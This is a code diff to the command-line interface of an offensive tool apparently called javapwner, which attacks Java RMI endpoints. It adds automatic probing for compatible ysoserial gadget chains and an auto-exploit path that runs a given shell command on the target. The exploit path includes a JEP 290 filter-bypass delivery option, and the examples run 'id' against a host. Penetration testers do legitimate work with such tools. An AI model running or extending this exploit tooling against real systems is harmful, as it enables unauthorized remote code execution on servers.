@@ -53,8 +53,16 @@ def rmi() -> None:
               help="TCP port to scan. Omit to auto-scan common RMI/JMX ports.")
 @click.option("--urldns", "urldns_canary", default=None, metavar="URL",
               help="Send a URLDNS payload via DGC to detect blind deserialization (check DNS logs).")
+@click.option("-G", "--detect-gadgets", "detect_gadgets", is_flag=True, default=False,
+              help="Probe which ysoserial gadgets are compatible with the target classpath (slow).")
 @click.pass_context
-def scan_cmd(ctx: click.Context, target: str, port: int | None, urldns_canary: str | None) -> None:
+def scan_cmd(
+    ctx: click.Context,
+    target: str,
+    port: int | None,
+    urldns_canary: str | None,
+    detect_gadgets: bool,
+) -> None:
     """Enumerate a Java RMI Registry and probe for JEP 290 filters.
 
     If -p is omitted, auto-scans common RMI/JMX ports and reports all
@@ -97,9 +105,16 @@ def scan_cmd(ctx: click.Context, target: str, port: int | None, urldns_canary: s
         return
 
     # ---- Single-port scan ----
-    with fmt.status(f"Scanning {target}:{port}…"):
+    status_msg = f"Scanning {target}:{port}…"
+    if detect_gadgets:
+        status_msg = f"Scanning {target}:{port} (+ gadget probe)…"
+    with fmt.status(status_msg):
         try:
-            result = scanner.scan(target, port, urldns_canary=urldns_canary)
+            result = scanner.scan(
+                target, port,
+                urldns_canary=urldns_canary,
+                detect_gadgets=detect_gadgets,
+            )
         except JavaPwnerError as exc:
             fmt.error(str(exc))
             sys.exit(1)
@@ -161,6 +176,29 @@ def scan_cmd(ctx: click.Context, target: str, port: int | None, urldns_canary: s
         fmt.success(f"URLDNS payload sent — canary: {result.urldns_canary}")
         fmt.info("  Check your DNS server logs for resolution.")
 
+    # Gadget compatibility
+    if not result.gadgets_detection_skipped:
+        fmt.section("Gadget Compatibility")
+        if result.gadgets_compatible:
+            fmt.success(f"Compatible gadgets ({len(result.gadgets_compatible)}):")
+            for g in result.gadgets_compatible:
+                fmt.info(f"  [+] {g}")
+            fmt.info(
+                f"  Hint: javapwner rmi exploit -t {target} -p {port} "
+                f"--gadget {result.gadgets_compatible[0]} --cmd '<COMMAND>'"
+            )
+        else:
+            if result.jep290_active:
+                fmt.warning(
+                    "No compatible gadgets (JEP 290 is filtering all chains).\n"
+                    "  Try --via jep290-bypass to bypass the filter."
+                )
+            else:
+                fmt.warning(
+                    f"No compatible gadgets found "
+                    f"({len(result.gadgets_tested)} tested)."
+                )
+
 
 def _display_scan_results(fmt: OutputFormatter, target: str, results: list) -> None:
     """Render multiple RmiScanResult objects (auto-discovery output)."""
@@ -217,8 +255,9 @@ def _display_scan_results(fmt: OutputFormatter, target: str, results: list) -> N
 @rmi.command("exploit")
 @click.option("-t", "--target", required=True, metavar="HOST")
 @click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int)
-@click.option("--gadget", required=True, metavar="NAME",
-              help="ysoserial gadget chain name (e.g. CommonsCollections6).")
+@click.option("--gadget", default=None, metavar="NAME",
+              help="ysoserial gadget chain (e.g. CommonsCollections6). "
+                   "Omit to auto-detect compatible gadgets on the target.")
 @click.option("--cmd", "command", required=True, metavar="CMD",
               help="Shell command to execute on the target.")
 @click.option("--via", type=click.Choice(["dgc", "registry", "jep290-bypass"]),
@@ -229,11 +268,14 @@ def exploit_cmd(
     ctx: click.Context,
     target: str,
     port: int,
-    gadget: str,
+    gadget: str | None,
     command: str,
     via: str,
 ) -> None:
     """Deliver a ysoserial payload to a Java RMI endpoint.
+
+    If --gadget is omitted, the tool probes the target's classpath via DGC to
+    find compatible gadget chains automatically and uses the first one found.
 
     \b
     Delivery vectors:
@@ -243,7 +285,7 @@ def exploit_cmd(
     \b
     Examples:
       javapwner rmi exploit -t 10.0.0.5 -p 1099 --gadget CommonsCollections6 --cmd 'id'
-      javapwner rmi exploit -t 10.0.0.5 -p 8282 --gadget Spring1 --cmd 'id' --via dgc
+      javapwner rmi exploit -t 10.0.0.5 -p 8282 --cmd 'id'   (auto-detect gadget)
     """
     fmt = _get_fmt(ctx)
     timeout = _get_timeout(ctx)
@@ -255,13 +297,36 @@ def exploit_cmd(
         fmt.error(str(exc))
         sys.exit(1)
 
-    fmt.info(f"Exploiting {target}:{port} via {via} with gadget '{gadget}' → {command!r}")
+    # ---- Auto-detect gadget when none specified ----
+    if gadget is None:
+        fmt.info(f"No gadget specified — probing compatible gadgets on {target}:{port}…")
+        with fmt.status("Detecting gadgets…"):
+            try:
+                compatible, result = exploiter.auto_exploit(target, port, command, via=via)
+            except JavaPwnerError as exc:
+                fmt.error(str(exc))
+                sys.exit(1)
 
-    try:
-        result = exploiter.exploit(target, port, gadget, command, via=via)
-    except JavaPwnerError as exc:
-        fmt.error(str(exc))
-        sys.exit(1)
+        if not compatible:
+            fmt.error(
+                "No compatible gadgets found on the target.\n"
+                "  Possible reasons:\n"
+                "  • JEP 290 is active (try --via jep290-bypass)\n"
+                "  • None of the tested libraries are on the target's classpath\n"
+                "  • ysoserial.jar not found (set YSOSERIAL_PATH)"
+            )
+            sys.exit(1)
+
+        fmt.info(f"Compatible gadgets: {', '.join(compatible)}")
+        fmt.info(f"Using: {compatible[0]}")
+    else:
+        # ---- Explicit gadget ----
+        fmt.info(f"Exploiting {target}:{port} via {via} with gadget '{gadget}' → {command!r}")
+        try:
+            result = exploiter.exploit(target, port, gadget, command, via=via)
+        except JavaPwnerError as exc:
+            fmt.error(str(exc))
+            sys.exit(1)
 
     if fmt.json_mode:
         fmt.print_json(result.to_dict())
@@ -271,12 +336,13 @@ def exploit_cmd(
         fmt.error(f"Exploit failed: {result.error}")
         sys.exit(1)
 
+    used = result.gadget_used or gadget or "unknown"
     if result.likely_success:
-        fmt.success("Payload delivered — no exception in response (likely executed).")
+        fmt.success(f"[{used}] Payload delivered — no exception in response (likely executed).")
     elif result.exception_in_response:
-        fmt.warning("TC_EXCEPTION in response — payload may have been filtered (JEP 290?).")
+        fmt.warning(f"[{used}] TC_EXCEPTION in response — payload may have been filtered (JEP 290?).")
     elif result.sent:
-        fmt.info("Payload sent — no response received (blind execution).")
+        fmt.info(f"[{used}] Payload sent — no response received (blind execution).")
     else:
         fmt.error("Payload was not sent.")
 
